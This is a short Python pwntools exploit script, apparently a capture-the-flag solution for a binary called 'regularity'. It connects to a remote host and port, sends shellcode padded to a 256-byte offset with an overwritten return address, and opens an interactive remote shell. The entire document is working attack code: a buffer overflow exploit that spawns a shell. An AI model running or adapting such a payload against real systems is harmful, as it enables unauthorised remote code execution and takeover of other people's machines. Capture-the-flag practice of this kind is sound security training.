from pwn import *

exe = ELF('./regularity')
context.binary = exe
context.log_level = 'debug'

# Testing lokal
# io = process('./regularity')

# Remote exploit
HOST = '154.57.164.71'
PORT = 44605
io = remote(HOST, PORT)

rsi_addr = 0x0000000000401041
offset = 256

shellcode = asm(shellcraft.sh())

shellcode_len = len(shellcode)

payload = shellcode + b"A" * (offset - shellcode_len) + p64(rsi_addr)
io.recvuntil(b'days?')
io.send(payload)

# Wait for shell
sleep(0.5)

# Start interactive shell
io.interactive()
